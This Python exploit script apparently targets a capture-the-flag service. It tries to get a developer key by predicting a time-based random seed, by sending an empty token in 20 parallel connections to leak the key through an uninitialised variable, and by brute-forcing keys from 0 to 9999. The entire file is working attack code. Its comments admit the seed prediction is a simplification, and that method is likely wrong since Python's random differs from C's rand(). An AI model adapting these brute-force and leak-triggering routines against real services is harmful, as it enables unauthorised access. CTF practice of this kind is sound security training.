#!/usr/bin/env python3
import socket
import time
import re
import threading

def connect_to_server(host, port):
    """连接到远程服务器"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((host, port))
    return s

def recv_until(s, delimiter, timeout=5):
    """接收数据直到遇到分隔符"""
    data = b""
    s.settimeout(timeout)
    try:
        while delimiter.encode() not in data:
            chunk = s.recv(1024)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data.decode(errors='ignore')

def try_brute_force_dev_key():
    """尝试暴力破解或利用时间相关的漏洞"""
    host = "ghost-in-the-stack.chall.edgesecurity.team"
    port = 1344
    
    print("[+] 尝试利用时间相关的seed来预测开发者密钥...")
    
    # 由于srand(time(NULL))，我们可以尝试预测可能的seed值
    import time as time_module
    current_time = int(time_module.time())
    
    # 尝试当前时间前后的几个可能值
    for time_offset in range(-5, 6):
        seed_time = current_time + time_offset
        print(f"[*] 尝试时间seed: {seed_time}")
        
        # 计算可能的dev_key (模拟rand() & 0xFFFFFF)
        # 注意：这是一个简化，实际的rand()实现可能不同
        import random
        random.seed(seed_time)
        possible_key = random.getrandbits(24)  # 模拟rand() & 0xFFFFFF
        
        print(f"[*] 计算可能的密钥: 0x{possible_key:x} ({possible_key})")
        
        if try_key_direct(host, port, possible_key):
            return possible_key
    
    return None

def try_key_direct(host, port, key):
    """直接尝试使用给定的密钥"""
    try:
        s = connect_to_server(host, port)
        
        # 等待菜单
        data = recv_until(s, "Choice:")
        
        # 选择选项1
        s.send(b"1\n")
        
        # 等待subscription key提示
        data = recv_until(s, "Enter your subscription key:")
        
        # 发送密钥
        s.send(f"{key}\n".encode())
        
        # 接收响应
        response = recv_until(s, "\n", timeout=3)
        print(f"[DEBUG] 响应: {response}")
        
        if "Developer mode activated!" in response or "flag{" in response or "edge{" in response:
            print(f"[SUCCESS] 密钥 {key} (0x{key:x}) 成功!")
            # 继续接收更多数据
            time.sleep(1)
            try:
                more_data = s.recv(1024).decode(errors='ignore')
                print(f"[FLAG] {response + more_data}")
                s.close()
                return True
            except:
                pass
        
        s.close()
        return False
        
    except Exception as e:
        print(f"[ERROR] 测试密钥 {key} 失败: {e}")
        return False

def exploit_multiple_connections():
    """使用多连接并行尝试"""
    host = "ghost-in-the-stack.chall.edgesecurity.team"
    port = 1344
    
    print("[+] 使用多连接并行尝试未初始化变量攻击...")
    
    def single_attempt(attempt_num):
        try:
            s = connect_to_server(host, port)
            
            # 快速导航到漏洞点
            s.recv(1024)  # 接收菜单
            s.send(b"2\n")  # 选择选项2
            s.recv(1024)   # 接收prompt
            s.send(b"1\n")  # 发送access level
            s.recv(1024)   # 接收token prompt
            s.send(b"\n")   # 发送空行触发漏洞
            
            # 等待响应
            time.sleep(0.5)
            response = s.recv(4096).decode(errors='ignore')
            
            dev_key_match = re.search(r"Developer Mode Key: (0x[0-9A-Fa-f]+)", response)
            if dev_key_match:
                dev_key = dev_key_match.group(1)
                print(f"[SUCCESS] 尝试 #{attempt_num} 泄露密钥: {dev_key}")
                s.close()
                
                # 立即使用这个密钥
                dev_key_int = int(dev_key, 16)
                if try_key_direct(host, port, dev_key_int):
                    return dev_key_int
            
            s.close()
            
        except Exception as e:
            print(f"[ERROR] 尝试 #{attempt_num} 失败: {e}")
        
        return None
    
    # 并行尝试
    threads = []
    for i in range(20):  # 20个并行连接
        t = threading.Thread(target=single_attempt, args=(i+1,))
        threads.append(t)
        t.start()
        time.sleep(0.1)  # 稍微错开启动时间
    
    for t in threads:
        t.join()

def main():
    print("[+] Ghost in the Stack Exploit v2")
    print("[+] 尝试多种攻击方法...")
    
    # 方法1: 时间种子预测
    key = try_brute_force_dev_key()
    if key:
        print(f"[SUCCESS] 通过时间预测找到密钥: {key}")
        return
    
    # 方法2: 多连接并行攻击
    exploit_multiple_connections()
    
    # 方法3: 简单暴力破解小范围
    print("[+] 尝试暴力破解小范围密钥...")
    host = "ghost-in-the-stack.chall.edgesecurity.team"
    port = 1344
    
    for key in range(0, 10000):  # 尝试小范围
        if key % 1000 == 0:
            print(f"[*] 测试密钥范围: {key}")
        
        if try_key_direct(host, port, key):
            print(f"[SUCCESS] 找到有效密钥: {key}")
            return

if __name__ == "__main__":
    main()